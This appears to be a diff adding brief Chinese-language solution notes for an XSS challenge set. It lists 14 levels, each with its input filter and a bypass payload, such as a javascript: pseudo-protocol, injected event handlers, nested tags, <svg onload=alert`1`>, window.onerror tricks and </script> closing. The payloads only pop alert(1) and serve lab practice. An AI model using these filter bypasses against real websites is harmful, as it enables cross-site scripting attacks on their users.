@@ -1,0 +1,34 @@
+1.	xxx搜索：直接执行（非DOM型，没有任何过滤）
+
+2.	邀请链接：javascript伪协议（伪协议，没有任何过滤）
+
+3.	年龄转换器：DOM型，没有任何过滤
+
+4.	祝福语生成器：<!---->注释
+
+5.	年龄转换器，//注释：\%0Aalert(1)%2F%2F
+
+6.	通过qq号生成qq邮箱，事件："onclick=alert(1)//
+
+7.	xxx搜索，正则单次过滤<>：<<img src>>
+
+8.	xxx搜索,全局过滤（和）<svg onlaod=alert`1`>
+
+9.	xxx搜索,全局过滤（)和`:window.onerror=alert;throw 1
+
+10.	xxx搜索,全局单次过滤（)和`:<img src=a onerror=alert``1`>
+
+11.	xxx搜索,大小写绕过：
+
+12.	xxx搜索，双写绕过
+
+13.	年龄转换器:</script>闭合
+
+14.	结合上下文：<svg/onload=eval(xss.get`x`)>
+
+
+
+
+
+
+
